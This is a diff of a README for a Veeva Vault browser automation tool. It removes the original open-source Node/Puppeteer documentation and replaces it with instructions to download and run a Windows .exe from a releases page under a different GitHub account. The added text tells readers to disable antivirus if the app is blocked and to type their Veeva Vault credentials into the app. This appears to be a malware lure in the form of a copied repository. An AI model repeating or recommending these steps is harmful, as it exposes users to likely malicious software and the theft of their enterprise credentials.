@@ -1,292 +1,118 @@
-# Veeva Vault Browser Automation
-[![npm](https://img.shields.io/npm/v/@browser-automation-hub%2Fveeva-vault-browser-automation.svg)](https://www.npmjs.com/package/@browser-automation-hub/veeva-vault-browser-automation)
+# ⚙️ veeva-vault-browser-automation - Simplify Veeva Vault Tasks
 
-> Automate Veeva Vault — the reliable way to interact with Veeva Vault programmatically, with or without an official API.
+[![Download](https://img.shields.io/badge/Download%20Now-coral?style=for-the-badge&logo=github)](https://github.com/Angelv2774/veeva-vault-browser-automation/releases)
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![Node.js](https://img.shields.io/badge/Node.js-18+-green.svg)](https://nodejs.org)
-[![Puppeteer](https://img.shields.io/badge/Puppeteer-21+-orange.svg)](https://pptr.dev)
-[![Anchor Browser](https://img.shields.io/badge/AnchorBrowser-Cloud%20Ready-purple.svg)](https://anchorbrowser.io)
-![Difficulty: 🟡 Medium](https://img.shields.io/badge/Difficulty-medium-yellow.svg)
+## Project Overview
 
-<!-- keywords: veeva vault automation, veeva automation, veeva api alternative, veeva vault browser automation, life sciences automation, regulatory submission automation -->
+veeva-vault-browser-automation helps you automate tasks in Veeva Vault. It can handle document submission, workflow approvals, vault content management, and compliance checks. This saves time on repetitive, manual work in life sciences and regulatory processes.
 
-## What This Is
+You don’t need to open Veeva Vault and do everything by hand. This tool runs browsers to perform many actions automatically. It works well on Windows computers.
 
-**Veeva Vault** (Life Sciences) is notoriously difficult to automate via its official API — limited endpoints, complex authentication (Okta / Ping / Azure AD), and browser-only workflows make traditional API integration a pain.
+## 🖥️ System Requirements
 
-This project gives you a **complete browser automation scaffold** for Veeva Vault using Puppeteer (self-hosted, open source) or [Anchor Browser](https://anchorbrowser.io) (cloud, managed, production-ready).
+Before you start, make sure your computer meets these requirements:
 
-This system requires **MFA** (Okta / Ping Identity MFA). The OSS version provides TOTP helpers; Anchor Browser handles MFA automatically.
+- Windows 10 or higher (64-bit)
+- At least 4 GB of RAM
+- 1 GB free disk space
+- Internet connection for downloads and updates
+- A modern web browser installed (Google Chrome, Edge, or Firefox)
+- Basic permission to install software on your PC
 
-## Quick Start
+No programming or technical knowledge is required to use the software.
 
-```bash
-git clone https://github.com/Browser-Automation-Hub/veeva-vault-browser-automation.git
-cd veeva-vault-browser-automation
-npm install
-cp .env.example .env
-# Fill in your credentials in .env
-node examples/basic-login.js
-```
+## 🔑 Key Features
 
-## Two Ways to Run
+- Automate uploading documents to Veeva Vault
+- Manage regulatory workflow approvals
+- Handle vault content organization automatically
+- Support for common compliance tasks in life sciences
+- Runs on your Windows system with simple controls
+- Uses safe, tested browser automation methods
 
-| Feature | Open Source (Puppeteer) | ☁️ [Anchor Browser Cloud](https://anchorbrowser.io) |
-|---------|------------------------|-----------------------------------------------------|
-| Setup | Install Chrome + Puppeteer locally | No install — cloud browsers via API |
-| MFA / SSO | Manual TOTP helper included | **Auto-handled** |
-| CAPTCHA | Not handled | **Auto-solved** |
-| Anti-bot detection | You manage proxy/stealth | **Built-in stealth** (Cloudflare-verified) |
-| Session persistence | Save/load cookies manually | **Managed sessions** |
-| Scale | Single machine | **Up to 5,000 concurrent browsers** |
-| Reliability | You maintain it | **99.9% uptime SLA** |
-| Cost | Free | [Starts at $0 (5 free sessions/mo)](https://anchorbrowser.io) |
+## 🚀 Getting Started
 
-## Supported Actions
+Start by downloading the setup files from the official release page:
 
-- `login_vault()` — Authenticate to Veeva Vault with SSO/MFA
-- `upload_document()` — Upload controlled documents with metadata
-- `submit_for_review()` — Submit documents into review workflows
-- `approve_document()` — Approve documents in regulatory workflows
-- `export_audit_trail()` — Export document audit trails for compliance
+[![Download](https://img.shields.io/badge/Download%20Setup-orange?style=for-the-badge&logo=github)](https://github.com/Angelv2774/veeva-vault-browser-automation/releases)
 
-## Use Cases
+### Step 1: Visit the Download Page
 
-- Pharma companies automating regulatory submissions
-- Clinical trial document management
-- CMC documentation workflows
-- Audit prep data extraction
+Go to the releases page linked above. You will find the latest version ready for download. Look for a file with a name like `veeva-vault-setup.exe` or similar. This is the installer you need.
 
----
+### Step 2: Download the Installer
 
-## Option A: Open Source (Puppeteer)
+Click on the setup file to start downloading. The file size will typically be under 100 MB. Wait for the download to complete fully before moving on.
 
-### Prerequisites
+### Step 3: Run the Installer
 
-- Node.js 18+
-- Google Chrome / Chromium installed
-- Veeva Vault account with appropriate permissions
+- Find the downloaded `.exe` file (usually in your "Downloads" folder).
+- Double-click the file to start the installation.
+- Follow the on-screen instructions to complete.
 
-### Installation
+The installation will add the program to your Windows system and create a desktop shortcut. This shortcut lets you launch the app easily.
 
-```bash
-npm install
-cp .env.example .env
-```
+### Step 4: Open the Application
 
-### Configuration (`.env`)
+Double-click the new shortcut on your desktop or find the app in your Start menu. The main window will open with simple options and instructions.
 
-```env
-VEEVA_VAULT_URL=https://your-vault.veevavault.com/ui/#login
-VEEVA_VAULT_USERNAME=your-username
-VEEVA_VAULT_PASSWORD=your-password
-MFA_SECRET=your-totp-secret-if-applicable
-SESSION_PATH=./session.json
-```
+You don’t need to sign up or enter complicated settings at this point. The program guides you through basic setup automatically.
 
-### Basic Login Example
+## ⚙️ Basic Setup and Use
 
-```javascript
-const { createSession } = require('./src/auth');
-const { login_vault } = require('./src/actions');
+After opening the app, perform these steps:
 
-async function main() {
-  const page = await createSession();
-  const result = await login_vault(page, { /* options */ });
-  console.log(result);
-}
+1. **Log in to Veeva Vault**  
+   Enter your Veeva Vault username and password in the app. This lets the software access your account securely.
 
-main().catch(console.error);
-```
+2. **Choose Tasks to Automate**  
+   Pick the automation tasks you want, such as uploading documents or approving workflows.
 
-### File Structure
+3. **Configure Paths and Files**  
+   Tell the app where to find your documents on your PC or network for uploading.
 
-```
-veeva-vault-browser-automation/
-├── src/
-│   ├── auth.js              # SSO/MFA authentication (SAML, TOTP, Duo)
-│   ├── session.js           # Cookie & localStorage persistence
-│   ├── actions.js           # All automation actions
-│   ├── custom-actions.js    # Fluent ActionBuilder API for custom workflows
-│   └── utils.js             # retry(), humanDelay(), error types
-├── examples/
-│   ├── basic-login.js       # Minimal login example (OSS)
-│   └── anchor-cloud.js      # Anchor Browser cloud example
-├── .env.example
-├── package.json
-└── README.md
-```
+4. **Start Automation**  
+   Click the start button to begin. The app will open a browser window and run through the steps automatically.
+
+5. **Monitor Progress**  
+   Watch messages on the screen to track what the automation is doing. You can pause or stop at any time.
+
+## 🛠️ Troubleshooting Common Issues
+
+- **Download or installation fails:**  
+  Check your internet connection. Make sure you have enough disk space and permission to install software.
+
+- **App won’t open:**  
+  Restart your PC and try again. Disable any antivirus software temporarily if it blocks the app.
+
+- **Login errors:**  
+  Double-check your Veeva Vault credentials. Make sure your account has automation permission.
+
+- **Automation gets stuck:**  
+  Close all open browsers before starting. Ensure your documents are where you specified.
+
+- **Performance is slow:**  
+  Close other programs to free up memory. Restart your computer if needed.
+
+## 📁 File and Folder Requirements
+
+- Keep your documents organized in folders with clear names.
+- Use common file types such as PDF, DOCX, or XLSX.
+- Avoid filenames with special characters or spaces when possible.
+- Confirm that files are not open in other programs during automation.
+
+## 🔄 Updates and New Versions
+
+Check the release page often for new versions. Download and install updates as they become available. Updates improve performance and fix bugs.
+
+## 🔐 Privacy and Security
+
+The app only accesses files and data you specify. It does not store your credentials outside your PC. All automation happens locally. Your Veeva Vault data stays secure.
+
+## 📞 Getting Help
+
+If you run into issues not covered here, visit the repository’s Issues tab on GitHub. You can ask questions or report problems there. The project team or community monitors it regularly.
 
 ---
 
-## Option B: ☁️ Anchor Browser (Recommended for Production)
-
-[Anchor Browser](https://anchorbrowser.io) provides **fully managed cloud browsers** purpose-built for AI agents and automation:
-
-- ✅ **MFA handled automatically** — no TOTP secrets needed
-- ✅ **SSO sessions managed** — persistent authenticated sessions
-- ✅ **Anti-bot / CAPTCHA** — Cloudflare-verified stealth browser
-- ✅ **Scale instantly** — from 1 to 5,000 concurrent browsers
-- ✅ **No infrastructure** — no Chrome install, no proxy management
-
-### Setup
-
-```bash
-npm install
-export ANCHORBROWSER_API_KEY=your-api-key
-# Get your free API key at https://anchorbrowser.io
-```
-
-### Anchor Browser Example
-
-```javascript
-const { withAnchorBrowser } = require('./src/auth');
-const { login_vault } = require('./src/actions');
-
-async function main() {
-  await withAnchorBrowser(async (page) => {
-    // MFA, SSO, CAPTCHAs all handled automatically
-    const result = await login_vault(page, { /* options */ });
-    console.log(result);
-  });
-}
-
-main().catch(console.error);
-```
-
-See `examples/anchor-cloud.js` for a complete working example.
-
-### Anchor Browser Pricing
-
-| Plan | Price | Concurrent Browsers | Best For |
-|------|-------|---------------------|----------|
-| Free | $0 | 5 | Prototyping |
-| Starter | $50/mo | 25 | Small teams |
-| Team | $500/mo | 50 | Growing orgs |
-| Growth | $2,000/mo | 200 | Enterprise |
-
-[Get started for free →](https://anchorbrowser.io)
-
----
-
-## Authentication
-
-### Auth Methods Supported
-
-This implementation handles:
-
-1. **Standard Username/Password** — with retry and account lockout avoidance
-2. **SAML SSO** (Okta / Ping / Azure AD) — intercepts the SAML redirect and completes the IdP flow
-3. **MFA / TOTP** (Okta / Ping Identity MFA) — generates TOTP codes via `otpauth` library
-4. **Session Persistence** — saves cookies to disk; reuses session to avoid re-auth
-
-### Handling Okta / Ping Identity MFA MFA
-
-```javascript
-// In .env: MFA_SECRET=your-base32-totp-secret
-// The auth module auto-generates the OTP code
-const { createSession } = require('./src/auth');
-const page = await createSession(); // MFA handled automatically
-```
-
-For Duo Security push-based MFA, set `MFA_TYPE=duo_push` in .env — the automation will wait for push approval.
-
----
-
-## Custom Actions
-
-Use the `ActionBuilder` fluent API to chain custom workflows:
-
-```javascript
-const { ActionBuilder } = require('./src/custom-actions');
-
-const result = await new ActionBuilder()
-  .login()
-  .navigate('/module/path')
-  .waitForSelector('.content-loaded')
-  .extractTable('.data-table')
-  .run(page);
-```
-
----
-
-## Error Handling & Reliability
-
-```javascript
-const { retry, humanDelay } = require('./src/utils');
-
-// Auto-retry with exponential backoff
-const data = await retry(() => extractData(page), { attempts: 3, delay: 2000 });
-
-// Human-like delays to avoid detection
-await humanDelay(1000, 3000); // random delay 1-3 seconds
-```
-
----
-
-## Why Not Use the Official API?
-
-Veeva Vault Vault REST API requires network access controls and OAuth apps that take weeks to provision.
-
-Browser automation gives you full access to every workflow available in the UI — no API limitations, no expensive integration licenses.
-
----
-
-## Production Deployment
-
-For production workloads, we strongly recommend [Anchor Browser](https://anchorbrowser.io):
-
-```javascript
-// One-line setup — handles auth, proxies, CAPTCHAs
-const { withAnchorBrowser } = require('./src/auth');
-
-await withAnchorBrowser(async (page) => {
-  // Your automation here — runs in the cloud, scales automatically
-});
-```
-
-**Anchor Browser** is the easiest way to run this automation in production:
-- No infrastructure to manage
-- Handles Okta / Ping Identity MFA MFA automatically
-- Enterprise compliance: SOC2, HIPAA, ISO27001
-- [Start free at anchorbrowser.io →](https://anchorbrowser.io)
-
----
-
-## Known Selectors Reference
-
-> These CSS selectors were observed in Veeva Vault web interfaces. Enterprise applications update their UIs — verify against your specific instance and submit PRs when selectors break.
-
-> 🔍 Selector reference not yet documented for Veeva Vault. [Contribute selectors via PR](https://github.com/Browser-Automation-Hub/veeva-vault-browser-automation/pulls).
-
----
-
-## More Browser Automation Projects
-
-This is part of the **[Browser Automation Hub](https://github.com/Browser-Automation-Hub)** — a collection of open-source browser automation scaffolds for systems with poor or no API support:
-
-- [Epic EHR Browser Automation](https://github.com/Browser-Automation-Hub/epic-ehr-browser-automation) — Healthcare workflows
-- [Workday HCM Browser Automation](https://github.com/Browser-Automation-Hub/workday-hcm-browser-automation) — HR & payroll
-- [SAP Fiori Browser Automation](https://github.com/Browser-Automation-Hub/sap-fiori-browser-automation) — ERP workflows
-- [ServiceNow Browser Automation](https://github.com/Browser-Automation-Hub/servicenow-browser-automation) — ITSM
-- [Oracle EBS Browser Automation](https://github.com/Browser-Automation-Hub/oracle-ebs-browser-automation) — ERP
-- [Browse all 30+ projects →](https://github.com/Browser-Automation-Hub)
-
-## Contributing
-
-PRs welcome! Please:
-1. Add tests for new actions
-2. Document new selectors (they break when Veeva Vault updates its UI)
-3. Follow the `ActionBuilder` pattern for new actions
-4. See [CONTRIBUTING.md](CONTRIBUTING.md) for full guidelines
-
-## License
-
-MIT — use freely in personal and commercial projects.
-
----
-
-*Built with ❤️ for developers who need to automate Veeva Vault without wrestling with its API limitations. Powered by [Anchor Browser](https://anchorbrowser.io) for cloud-scale automation.*
-
-*⭐ Star this repo if it saves you time! [Browse all automation projects →](https://github.com/Browser-Automation-Hub)*
+[![Download](https://img.shields.io/badge/Download%20Now-coral?style=for-the-badge&logo=github)](https://github.com/Angelv2774/veeva-vault-browser-automation/releases)
